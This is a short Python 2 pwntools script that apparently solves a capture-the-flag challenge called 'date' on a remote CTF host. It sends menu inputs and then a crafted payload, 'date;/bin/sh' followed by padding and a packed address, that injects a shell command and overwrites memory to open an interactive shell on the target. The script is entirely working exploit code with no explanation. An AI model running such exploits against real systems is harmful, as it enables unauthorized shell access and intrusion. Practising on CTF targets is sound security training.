from pwn import *

#r = process("./date")
r = remote('pwn2.sect.ctf.rocks', 6666)
print r.recv()
r.sendline("1")
r.sendline("1")
print r.recv()
payload = "date;/bin/sh\x00"
payload += "a"*(0x6012A8-0x6010A4-len(payload)) + p64(0x6010A4)
print payload
r.sendline(payload)
r.interactive()

